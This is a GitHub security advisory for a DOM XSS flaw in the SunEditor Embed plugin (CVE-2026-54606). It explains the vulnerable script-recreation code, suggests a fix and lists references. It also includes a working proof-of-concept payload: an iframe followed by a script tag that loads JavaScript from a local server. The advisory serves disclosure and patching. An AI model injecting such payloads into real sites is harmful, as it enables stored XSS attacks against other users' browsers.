# [H] SunEditor Embed Plugin has DOM XSS via External Script Element After Iframe Embed

## Summary
Severity: High
Advisory: GHSA-w93q-cq9w-58p7
CVE: CVE-2026-54606
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-26
Source: https://github.com/advisories/GHSA-w93q-cq9w-58p7
Type: github-advisory

## Affected
- npm: `suneditor` — affected >=0 <3.1.4

## Details
Summary

A DOM-based Cross-Site Scripting (XSS) vulnerability exists in the SunEditor Embed plugin. Crafted iframe embed HTML followed by an external <script src=...> element bypasses the plugin’s sanitization logic. The plugin recreates and appends the attacker-controlled script element to the live DOM, causing JavaScript execution in the context of the editor page.

If an application stores or reflects SunEditor content without additional backend sanitization, this can lead to stored or reflected XSS when another user opens, previews, renders, or edits the malicious content.

Details

The Embed plugin parses raw embed HTML and processes the resulting DOM nodes. When a <script> element is included after a valid iframe, the plugin creates a new script element using the attacker-controlled src value and appends it to the DOM.

Relevant behavior:

const embedDOM = new DOMParser().parseFromString(src, 'text/html').body.children;
if (/^script$/i.test(chd.nodeName)) {
  scriptTag = dom.utils.createElement('script', {
    src: chd.getAttribute('src'),
    async: 'true'
  }, null);
  continue;
}
cover.appendChild(scriptTag);

Because the script is newly created and appended, it executes.

PoC

Start a local server hosting a JavaScript payload:

```
mkdir -p /tmp/suneditor-poc
cd /tmp/suneditor-poc

cat > poc.js <<'EOF'
alert(1);
console.log("SunEditor Embed Plugin XSS executed");
EOF

python3 -m http.server 8000
```

Open SunEditor with the Embed plugin enabled, then insert the following payload through the Embed modal and save :

`<iframe src="https://youtube.com/embed/x"></iframe><script src="http://127.0.0.1:8000/poc.js"></script>
`
Successful exploitation is confirmed when:

`alert(1) appears`

or the local server logs:

`GET /poc.js`

Impact

An attacker who can provide or store embed HTML can execute arbitrary JavaScript in another user’s browser when the content is processed by SunEditor. This may allow account actions as the victim, modification of editor content, or access to sensitive data available in the editor page.

The issue is especially impactful when SunEditor content is stored in a backend and later reopened or rendered for administrators, editors, or other users without additional sanitization.

Suggested Fix

Do not recreate or append script elements from user-controlled embed HTML.

Minimum mitigation:

```
if (/^script$/i.test(chd.nodeName)) {
  continue;
}
```

A stronger fix is to allow only expected embed elements such as iframe or blockquote, sanitize their attributes, and discard all other sibling elements.

## References
- https://github.com/JiHong88/suneditor/security/advisories/GHSA-w93q-cq9w-58p7
- https://github.com/JiHong88/suneditor/issues/1649
- https://github.com/JiHong88/suneditor/commit/9d43a5e082101d2d6475cba86e0d58d7c2cf6677
- https://github.com/JiHong88/suneditor
- https://github.com/JiHong88/suneditor/releases/tag/3.1.4
